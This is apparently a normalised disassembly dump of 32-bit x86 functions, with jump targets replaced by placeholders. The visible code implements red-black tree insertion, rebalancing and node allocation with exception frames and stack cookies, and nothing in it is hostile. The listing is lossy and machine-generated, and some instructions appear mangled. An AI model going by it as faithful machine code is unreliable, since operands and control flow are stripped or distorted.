mov [ edx + 0x28 ] 0x1
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x28 ] bl
mov edx [ eax ]
mov esi [ edx + 0x4 ]
jmp r-xdata
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov eax [ esi + 0x4 ]
mov [ eax + 0x28 ] 0x1
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x4 ]
mov [ edx + 0x28 ] bl
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
mov edx [ ecx ]
mov [ eax + 0x8 ] edx
mov edx [ ecx ]
cmp [ edx + 0x29 ] bl
jne r-xdata
push edi
mov esi ecx
call sub_425960
mov ecx [ esi + 0x4 ]
lea eax [ esi + 0x4 ]
cmp [ ecx + 0x28 ] bl
je r-xdata
mov ecx [ eax ]
mov [ ecx + 0x28 ] 0x1
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x28 ] bl
mov edx [ eax ]
mov eax [ edx + 0x4 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
mov [ eax ] edx
mov edx [ ecx + 0x8 ]
cmp [ edx + 0x29 ] bl
jne r-xdata
mov esi ecx
mov ecx [ esi + 0x8 ]
mov eax [ ecx ]
mov [ esi + 0x8 ] eax
mov eax [ ecx ]
cmp [ eax + 0x29 ] bl
jne r-xdata
mov edx [ eax + 0x4 ]
mov [ ecx + 0x4 ] edx
mov edx [ edi + 0x18 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov edx [ eax + 0x4 ]
mov [ ecx + 0x4 ] edx
mov edx [ edi + 0x18 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov edx [ esi + 0x4 ]
lea eax [ esi + 0x4 ]
mov [ ecx + 0x4 ] edx
mov edx [ edi + 0x18 ]
cmp esi [ edx + 0x4 ]
jne r-xdata
mov [ eax + 0x4 ] esi
mov edx [ eax + 0x4 ]
cmp eax [ edx ]
jne r-xdata
mov [ edx + 0x4 ] ecx
jmp r-xdata
mov edx [ eax + 0x4 ]
cmp eax [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov edx [ eax ]
cmp esi [ edx ]
jne r-xdata
mov [ edx + 0x4 ] ecx
jmp r-xdata
mov [ edx + 0x8 ] ecx
mov [ edx ] ecx
jmp r-xdata
mov [ ecx ] eax
mov [ edx ] ecx
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov [ eax + 0x4 ] ecx
mov [ edx + 0x8 ] ecx
mov [ edx ] ecx
jmp r-xdata
mov [ ecx ] esi
mov [ eax ] ecx
sub_424150
sub esp 0x10
push ebp
mov ebp [ esp + 0x18 ]
push esi
push edi
mov edi [ ebx + 0x18 ]
mov eax [ edi + 0x4 ]
cmp [ eax + 0x29 ] 0x0
mov cl 0x1
mov [ esp + 0x20 ] cl
jne r-xdata
mov eax [ ebx ]
mov edx edi
mov [ esp + 0x14 ] edx
mov [ esp + 0x10 ] eax
test cl cl
je r-xdata
mov ecx [ esp + 0x24 ]
mov edx [ ecx ]
mov esi [ edx + 0xc ]
mov ecx [ esp + 0x24 ]
cmp esi [ ecx ]
jae r-xdata
mov edx [ ebx + 0x18 ]
mov esi [ edx ]
test eax eax
je r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
jmp r-xdata
pop edi
mov [ ebp ] eax
pop esi
mov [ ebp + 0x8 ] 0x0
mov [ ebp + 0x4 ] edx
mov eax ebp
pop ebp
add esp 0x10
retn 0x8
push ecx
mov ecx [ esp + 0x24 ]
push ecx
lea edx [ esp + 0x18 ]
mov ecx edi
push edx
mov edi ebx
call sub_423f10
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov [ ebp ] ecx
mov [ ebp + 0x8 ] 0x1
mov [ ebp + 0x4 ] edx
mov eax ebp
pop edi
pop esi
pop ebp
add esp 0x10
retn 0x8
call sub_4407b7
cmp eax eax
je r-xdata
cmp edx [ eax + 0xc ]
mov edi eax
setb cl
mov [ esp + 0x20 ] cl
test cl cl
je r-xdata
cmp [ eax + 0x29 ] 0x0
je r-xdata
lea esi [ esp + 0x10 ]
call sub_423e50
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov eax [ esp + 0x24 ]
push eax
push 0x1
lea ecx [ esp + 0x18 ]
push ecx
mov ecx edi
mov edi ebx
call sub_423f10
mov edx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x4 ] eax
mov [ ebp ] edx
mov [ ebp + 0x8 ] 0x1
mov eax ebp
pop edi
pop esi
pop ebp
add esp 0x10
retn 0x8
cmp edi esi
jne r-xdata
sub_424250
sub esp 0x1c
push ebx
push ebp
mov ebp [ esp + 0x28 ]
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
mov ecx [ ebx + 0x18 ]
push esi
push edi
jne r-xdata
mov eax [ esp + 0x38 ]
mov esi [ ecx ]
mov ecx [ ebx ]
test eax eax
je r-xdata
mov eax [ esp + 0x34 ]
push eax
push 0x1
push ebp
mov edi ebx
call sub_423f10
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn 0x10
call sub_4407b7
mov eax [ esp + 0x38 ]
cmp eax ecx
je r-xdata
mov esi [ ebx + 0x18 ]
mov edx [ ebx ]
test eax eax
je r-xdata
mov eax [ esp + 0x34 ]
mov edx [ eax ]
cmp edx [ ecx + 0xc ]
jae r-xdata
mov ecx [ esp + 0x3c ]
cmp ecx esi
jne r-xdata
call sub_4407b7
mov ecx [ esp + 0x3c ]
mov eax [ esp + 0x38 ]
cmp eax edx
je r-xdata
push eax
lea eax [ esp + 0x20 ]
push eax
call sub_424150
mov ecx [ eax ]
pop edi
mov [ ebp ] ecx
mov edx [ eax + 0x4 ]
pop esi
mov [ ebp + 0x4 ] edx
mov eax ebp
pop ebp
pop ebx
add esp 0x1c
retn 0x10
push eax
push 0x1
push ebp
mov edi ebx
call sub_423f10
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn 0x10
mov edi [ esp + 0x34 ]
mov edx [ edi ]
cmp [ ecx + 0xc ] edx
jbe r-xdata
mov eax [ ebx + 0x18 ]
mov ecx [ eax + 0x8 ]
mov edx [ ecx + 0xc ]
mov eax [ esp + 0x34 ]
cmp edx [ eax ]
jae r-xdata
cmp ecx esi
jne r-xdata
jae r-xdata
lea esi [ esp + 0x14 ]
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] ecx
call sub_423e50
mov edx [ edi ]
mov ecx [ esp + 0x18 ]
cmp [ ecx + 0xc ] edx
jae r-xdata
mov eax [ esp + 0x34 ]
mov edx eax
push edx
push 0x0
push ebp
mov edi ebx
call sub_423f10
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn 0x10
mov edx [ ebx ]
mov [ esp + 0x18 ] ecx
mov ecx [ ebx + 0x18 ]
lea esi [ esp + 0x14 ]
mov [ esp + 0x14 ] eax
mov [ esp + 0x20 ] ecx
mov [ esp + 0x1c ] edx
call sub_425c80
lea esi [ esp + 0x1c ]
lea edi [ esp + 0x14 ]
call sub_4105a0
mov ecx [ esp + 0x18 ]
test al al
jne r-xdata
mov ecx [ esp + 0x3c ]
mov eax [ esp + 0x38 ]
cmp [ ecx + 0xc ] edx
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x29 ] 0x0
push edi
mov edi ebx
je r-xdata
mov eax [ esp + 0x3c ]
mov edx [ eax + 0x8 ]
cmp [ edx + 0x29 ] 0x0
mov edi ebx
je r-xdata
mov eax [ esp + 0x34 ]
mov edx [ eax ]
cmp edx [ ecx + 0xc ]
jae r-xdata
mov ecx [ esp + 0x40 ]
push 0x1
push ebp
call sub_423f10
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn 0x10
push 0x0
push ebp
call sub_423f10
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn 0x10
mov edx [ esp + 0x34 ]
push edx
push 0x1
push ebp
call sub_423f10
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn 0x10
mov ecx [ esp + 0x34 ]
push ecx
push 0x0
push ebp
mov ecx eax
call sub_423f10
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn 0x10
sub_424430
mov ecx [ ebx + 0x18 ]
mov eax [ ecx + 0x4 ]
mov edx [ esp + 0x4 ]
sub esp 0x28
cmp [ eax + 0x29 ] 0x0
push esi
push edi
mov edi ecx
jne r-xdata
mov esi [ ebx ]
mov eax [ ebx + 0x18 ]
mov [ esp + 0x10 ] eax
test esi esi
je r-xdata
mov ecx [ edx ]
lea esp [ esp ]
call sub_4407b7
mov edx [ esp + 0x34 ]
cmp esi esi
je r-xdata
mov edi eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edx [ edx ]
xor eax eax
push edi
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] eax
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] eax
push esi
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esp + 0x18 ]
push ecx
mov eax ebx
mov [ esp + 0x24 ] edx
call sub_424250
mov esi [ eax ]
mov edi [ eax + 0x4 ]
mov ecx [ edx ]
cmp ecx [ edi + 0xc ]
jae r-xdata
cmp edi [ esp + 0x10 ]
je r-xdata
cmp [ eax + 0xc ] ecx
jae r-xdata
cmp [ eax + 0x29 ] 0x0
je r-xdata
mov esi [ esi ]
jmp r-xdata
call sub_4407b7
test esi esi
jne r-xdata
cmp edi [ esi + 0x18 ]
jne r-xdata
lea eax [ edi + 0x10 ]
pop edi
pop esi
add esp 0x28
retn 0x4
call sub_4407b7
sub_4244f0
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x31 ] 0x0
je r-xdata
call sub_4407b7
mov ecx [ eax ]
cmp [ ecx + 0x31 ] 0x0
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ esi + 0x4 ] eax
cmp [ eax + 0x31 ] 0x0
je r-xdata
mov eax [ eax + 0x4 ]
cmp [ eax + 0x31 ] 0x0
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x31 ] 0x0
jne r-xdata
retn
jmp sub_4407b7
mov ecx [ esi + 0x4 ]
cmp [ ecx + 0x31 ] 0x0
je r-xdata
lea ecx [ ecx ]
mov [ esi + 0x4 ] ecx
retn
mov ecx eax
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x31 ] 0x0
je r-xdata
mov [ esi + 0x4 ] eax
jmp sub_4407b7
mov [ esi + 0x4 ] eax
mov edx eax
mov eax [ edx + 0x4 ]
cmp [ eax + 0x31 ] 0x0
je r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx [ eax ]
jne r-xdata
sub_424570
push ebp
mov ebp esp
push 0xffffffff
push sub_45ac85
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
push 0x34
call sub_43fa1d
mov esi eax
add esp 0x4
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x1
test esi esi
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov [ esi ] eax
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] edx
mov eax [ edi ]
add edi 0x4
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
push edi
push eax
call sub_424c50
mov [ esi + 0x30 ] 0x0
mov [ esi + 0x31 ] 0x0
sub_424610
push 0xffffffff
push sub_45aca8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4c
push ebx
push ebp
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x5c ]
mov [ fs : 0x0 ] eax
mov esi ecx
cmp [ edi + 0x1c ] 0x71c71c6
jb r-xdata
mov eax [ edi + 0x18 ]
mov ecx [ esp + 0x74 ]
push eax
push esi
push eax
call sub_424570
inc [ edi + 0x1c ]
mov ebp eax
mov eax [ edi + 0x18 ]
xor ebx ebx
cmp esi eax
jne r-xdata
push 0x13
xor ebx ebx
push r--data
lea ecx [ esp + 0x1c ]
mov [ esp + 0x34 ] 0xf
mov [ esp + 0x30 ] ebx
mov [ esp + 0x20 ] bl
call sub_42a180
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x34 ]
mov [ esp + 0x68 ] ebx
call sub_4296c0
push r--data
lea ecx [ esp + 0x34 ]
push ecx
mov [ esp + 0x38 ] r--data
call sub_442eab
cmp [ esp + 0x70 ] bl
je r-xdata
mov [ eax + 0x4 ] ebp
mov edx [ edi + 0x18 ]
mov [ edx ] ebp
mov eax [ edi + 0x18 ]
jmp r-xdata
mov [ esi + 0x8 ] ebp
mov eax [ edi + 0x18 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov [ esi ] ebp
mov eax [ edi + 0x18 ]
cmp esi [ eax ]
jne r-xdata
mov [ eax + 0x8 ] ebp
mov ecx [ ebp + 0x4 ]
lea eax [ ebp + 0x4 ]
mov esi ebp
cmp [ ecx + 0x30 ] bl
jne r-xdata
mov [ eax ] ebp
jmp r-xdata
mov edx [ edi + 0x18 ]
mov eax [ edx + 0x4 ]
mov [ eax + 0x30 ] 0x1
mov eax [ esp + 0x6c ]
mov ecx [ edi ]
mov [ eax + 0x4 ] ebp
mov [ eax ] ecx
mov ecx [ esp + 0x5c ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebp
pop ebx
add esp 0x58
retn 0xc
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov edx [ edx ]
cmp [ edx + 0x30 ] bl
jne r-xdata
mov edx [ edx + 0x8 ]
cmp [ edx + 0x30 ] bl
je r-xdata
cmp esi [ ecx ]
jne r-xdata
mov [ ecx + 0x30 ] 0x1
mov [ edx + 0x30 ] 0x1
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x30 ] bl
mov edx [ eax ]
mov esi [ edx + 0x4 ]
jmp r-xdata
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov eax [ esi + 0x4 ]
mov [ eax + 0x30 ] 0x1
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x4 ]
mov [ edx + 0x30 ] bl
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
mov edx [ ecx ]
mov [ eax + 0x8 ] edx
mov edx [ ecx ]
cmp [ edx + 0x31 ] bl
jne r-xdata
push edi
mov esi ecx
call sub_4260b0
mov ecx [ esi + 0x4 ]
lea eax [ esi + 0x4 ]
cmp [ ecx + 0x30 ] bl
je r-xdata
mov ecx [ eax ]
mov [ ecx + 0x30 ] 0x1
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x30 ] bl
mov edx [ eax ]
mov eax [ edx + 0x4 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
mov [ eax ] edx
mov edx [ ecx + 0x8 ]
cmp [ edx + 0x31 ] bl
jne r-xdata
mov esi ecx
mov ecx [ esi + 0x8 ]
mov eax [ ecx ]
mov [ esi + 0x8 ] eax
mov eax [ ecx ]
cmp [ eax + 0x31 ] bl
jne r-xdata
mov edx [ eax + 0x4 ]
mov [ ecx + 0x4 ] edx
mov edx [ edi + 0x18 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov edx [ eax + 0x4 ]
mov [ ecx + 0x4 ] edx
mov edx [ edi + 0x18 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov edx [ esi + 0x4 ]
lea eax [ esi + 0x4 ]
mov [ ecx + 0x4 ] edx
mov edx [ edi + 0x18 ]
cmp esi [ edx + 0x4 ]
jne r-xdata
mov [ eax + 0x4 ] esi
mov edx [ eax + 0x4 ]
cmp eax [ edx ]
jne r-xdata
mov [ edx + 0x4 ] ecx
jmp r-xdata
mov edx [ eax + 0x4 ]
cmp eax [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov edx [ eax ]
cmp esi [ edx ]
jne r-xdata
mov [ edx + 0x4 ] ecx
jmp r-xdata
mov [ edx + 0x8 ] ecx
mov [ edx ] ecx
jmp r-xdata
mov [ ecx ] eax
mov [ edx ] ecx
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov [ eax + 0x4 ] ecx
mov [ edx + 0x8 ] ecx
mov [ edx ] ecx
jmp r-xdata
mov [ ecx ] esi
mov [ eax ] ecx
sub_424850
sub esp 0x10
push ebp
mov ebp [ esp + 0x18 ]
push esi
push edi
mov edi [ ebx + 0x18 ]
mov eax [ edi + 0x4 ]
cmp [ eax + 0x31 ] 0x0
mov cl 0x1
mov [ esp + 0x20 ] cl
jne r-xdata
mov eax [ ebx ]
mov edx edi
mov [ esp + 0x14 ] edx
mov [ esp + 0x10 ] eax
test cl cl
je r-xdata
mov ecx [ esp + 0x24 ]
mov edx [ ecx ]
mov esi [ edx + 0xc ]
mov ecx [ esp + 0x24 ]
cmp esi [ ecx ]
jae r-xdata
mov edx [ ebx + 0x18 ]
mov esi [ edx ]
test eax eax
je r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
jmp r-xdata
pop edi
mov [ ebp ] eax
pop esi
mov [ ebp + 0x8 ] 0x0
mov [ ebp + 0x4 ] edx
mov eax ebp
pop ebp
add esp 0x10
retn 0x8
push ecx
mov ecx [ esp + 0x24 ]
push ecx
lea edx [ esp + 0x18 ]
mov ecx edi
push edx
mov edi ebx
call sub_424610
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov [ ebp ] ecx
mov [ ebp + 0x8 ] 0x1
mov [ ebp + 0x4 ] edx
mov eax ebp
pop edi
pop esi
pop ebp
add esp 0x10
retn 0x8
call sub_4407b7
cmp eax eax
je r-xdata
cmp edx [ eax + 0xc ]
mov edi eax
setb cl
mov [ esp + 0x20 ] cl
test cl cl
je r-xdata
cmp [ eax + 0x31 ] 0x0
je r-xdata
lea esi [ esp + 0x10 ]
call sub_4244f0
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov eax [ esp + 0x24 ]
push eax
push 0x1
lea ecx [ esp + 0x18 ]
push ecx
mov ecx edi
mov edi ebx
call sub_424610
mov edx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x4 ] eax
mov [ ebp ] edx
mov [ ebp + 0x8 ] 0x1
mov eax ebp
pop edi
pop esi
pop ebp
add esp 0x10
retn 0x8
cmp edi esi
jne r-xdata
sub_424950
sub esp 0x1c
push ebx
push ebp
mov ebp [ esp + 0x28 ]
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
mov ecx [ ebx + 0x18 ]
push esi
push edi
jne r-xdata
mov eax [ esp + 0x38 ]
mov esi [ ecx ]
mov ecx [ ebx ]
test eax eax
je r-xdata
mov eax [ esp + 0x34 ]
push eax
push 0x1
push ebp
mov edi ebx
call sub_424610
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn 0x10
call sub_4407b7
mov eax [ esp + 0x38 ]
cmp eax ecx
je r-xdata
mov esi [ ebx + 0x18 ]
mov edx [ ebx ]
test eax eax
je r-xdata
mov eax [ esp + 0x34 ]
mov edx [ eax ]
cmp edx [ ecx + 0xc ]
jae r-xdata
mov ecx [ esp + 0x3c ]
cmp ecx esi
jne r-xdata
call sub_4407b7
mov ecx [ esp + 0x3c ]
mov eax [ esp + 0x38 ]
cmp eax edx
je r-xdata
push eax
lea eax [ esp + 0x20 ]
push eax
call sub_424850
mov ecx [ eax ]
pop edi
mov [ ebp ] ecx
mov edx [ eax + 0x4 ]
pop esi
mov [ ebp + 0x4 ] edx
mov eax ebp
pop ebp
pop ebx
add esp 0x1c
retn 0x10
push eax
push 0x1
push ebp
mov edi ebx
call sub_424610
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn 0x10
mov edi [ esp + 0x34 ]
mov edx [ edi ]
cmp [ ecx + 0xc ] edx
jbe r-xdata
mov eax [ ebx + 0x18 ]
mov ecx [ eax + 0x8 ]
mov edx [ ecx + 0xc ]
mov eax [ esp + 0x34 ]
cmp edx [ eax ]
jae r-xdata
cmp ecx esi
jne r-xdata
jae r-xdata
lea esi [ esp + 0x14 ]
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] ecx
call sub_4244f0
mov edx [ edi ]
mov ecx [ esp + 0x18 ]
cmp [ ecx + 0xc ] edx
jae r-xdata
mov eax [ esp + 0x34 ]
mov edx eax
push edx
push 0x0
push ebp
mov edi ebx
call sub_424610
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn 0x10
mov edx [ ebx ]
mov [ esp + 0x18 ] ecx
mov ecx [ ebx + 0x18 ]
lea esi [ esp + 0x14 ]
mov [ esp + 0x14 ] eax
mov [ esp + 0x20 ] ecx
mov [ esp + 0x1c ] edx
call sub_426a40
lea esi [ esp + 0x1c ]
lea edi [ esp + 0x14 ]
call sub_4105a0
mov ecx [ esp + 0x18 ]
test al al
jne r-xdata
mov ecx [ esp + 0x3c ]
mov eax [ esp + 0x38 ]
cmp [ ecx + 0xc ] edx
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x31 ] 0x0
push edi
mov edi ebx
je r-xdata
mov eax [ esp + 0x3c ]
mov edx [ eax + 0x8 ]
cmp [ edx + 0x31 ] 0x0
mov edi ebx
je r-xdata
mov eax [ esp + 0x34 ]
mov edx [ eax ]
cmp edx [ ecx + 0xc ]
jae r-xdata
mov ecx [ esp + 0x40 ]
push 0x1
push ebp
call sub_424610
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn 0x10
push 0x0
push ebp
call sub_424610
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn 0x10
mov edx [ esp + 0x34 ]
push edx
push 0x1
push ebp
call sub_424610
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn 0x10
mov ecx [ esp + 0x34 ]
push ecx
push 0x0
push ebp
mov ecx eax
call sub_424610
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn 0x10
sub_424b30
push ebp
mov ebp esp
push 0xffffffff
push sub_459020
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
mov [ ebp - 0x18 ] ebx
mov edi [ ebp + 0x8 ]
cmp [ edi + 0x15 ] 0x0
mov eax [ ebx + 0x18 ]
mov [ ebp - 0x14 ] eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
movzx ecx [ edi + 0x14 ]
mov edx [ ebp + 0xc ]
push ecx
push eax
push edx
lea esi [ edi + 0xc ]
push eax
call sub_424fc0
mov esi eax
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov ecx [ edi ]
push esi
push ecx
mov ecx ebx
call sub_424b30
mov [ esi ] eax
mov edx [ edi + 0x8 ]
push esi
push edx
mov ecx ebx
call sub_424b30
mov [ esi + 0x8 ] eax
mov [ ebp - 0x14 ] esi
sub_424be0
push esi
mov esi eax
mov eax [ ebx + 0x18 ]
push edi
mov edi [ esi + 0x18 ]
add eax 0x4
mov eax [ eax ]
push edi
push eax
mov ecx esi
call sub_424b30
mov [ edi + 0x4 ] eax
mov ecx [ ebx + 0x1c ]
mov edx [ esi + 0x18 ]
mov [ esi + 0x1c ] ecx
mov eax [ edx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov [ edx ] edx
mov esi [ esi + 0x18 ]
pop edi
mov [ esi + 0x8 ] esi
pop esi
retn
mov ecx [ eax ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov [ edx ] eax
mov esi [ esi + 0x18 ]
mov ecx [ esi + 0x4 ]
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov eax ecx
mov ecx [ eax ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
pop edi
mov [ esi + 0x8 ] ecx
pop esi
retn
mov ecx eax
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
sub_424c50
push ebp
mov ebp esp
push 0xffffffff
push sub_45a1f8
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x8 ]
push 0x4
call sub_43fa1d
add esp 0x4
test eax eax
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ esi ] eax
mov [ ebp - 0x4 ] 0x0
call sub_424d00
mov ebx [ ebp + 0xc ]
mov [ esi + 0x18 ] eax
mov cl 0x1
mov [ eax + 0x15 ] cl
mov eax [ esi + 0x18 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x18 ]
mov [ eax ] eax
mov eax [ esi + 0x18 ]
mov [ eax + 0x8 ] eax
mov eax esi
mov [ esi + 0x1c ] 0x0
mov [ ebp - 0x4 ] cl
call sub_424be0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_424d00
mov ecx 0x1
call sub_424f60
test eax eax
je r-xdata
lea ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov [ eax ] 0x0
lea ecx [ eax + 0x8 ]
test ecx ecx
je r-xdata
mov [ ecx ] 0x0
mov [ eax + 0x14 ] 0x1
mov [ eax + 0x15 ] 0x0
retn
mov [ ecx ] 0x0
sub_424d40
push 0xffffffff
push sub_459ce8
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x8 ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x18 ]
push 0x4
call sub_43fa1d
add esp 0x4
test eax eax
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ esi ] eax
mov [ esp + 0x10 ] 0x0
call sub_424d00
mov [ esi + 0x18 ] eax
mov [ eax + 0x15 ] 0x1
mov eax [ esi + 0x18 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x18 ]
mov [ eax ] eax
mov eax [ esi + 0x18 ]
mov [ eax + 0x8 ] eax
mov [ esi + 0x1c ] 0x0
mov eax esi
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0xc
retn 0x4
sub_424dc0
push 0xffffffff
push sub_45ad8a
mov eax [ fs : 0x0 ]
push eax
sub esp 0x50
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x64 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ esi + 0x18 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x31 ] 0x0
mov ebp ecx
jne r-xdata
mov edi [ esi ]
mov ebx [ esi + 0x18 ]
test edi edi
je r-xdata
mov ecx [ esp + 0x74 ]
mov ecx [ ecx ]
lea ecx [ ecx ]
call sub_4407b7
cmp edi edi
je r-xdata
mov ebp eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
jmp r-xdata
lea ecx [ esp + 0x1c ]
push ecx
call sub_424d40
mov edx [ esp + 0x74 ]
mov [ esp + 0x6c ] 0x0
mov eax [ edx ]
lea ecx [ esp + 0x1c ]
push ecx
lea edx [ esp + 0x44 ]
push edx
mov [ esp + 0x44 ] eax
call sub_424c50
push ebp
push edi
lea eax [ esp + 0x44 ]
push eax
lea ecx [ esp + 0x20 ]
push ecx
mov eax esi
mov [ esp + 0x7c ] 0x1
call sub_424950
mov edi [ eax ]
mov ebp [ eax + 0x4 ]
lea ecx [ esp + 0x3c ]
mov [ esp + 0x6c ] 0x0
call sub_4266d0
lea esi [ esp + 0x1c ]
mov [ esp + 0x6c ] 0x2
call sub_426630
mov edx [ esp + 0x1c ]
push edx
call sub_43f960
add esp 0x4
mov edx [ esp + 0x74 ]
mov eax [ edx ]
cmp eax [ ebp + 0xc ]
jae r-xdata
cmp ebp ebx
je r-xdata
cmp [ eax + 0xc ] ecx
jae r-xdata
cmp [ eax + 0x31 ] 0x0
je r-xdata
mov edi [ edi ]
jmp r-xdata
call sub_4407b7
test edi edi
jne r-xdata
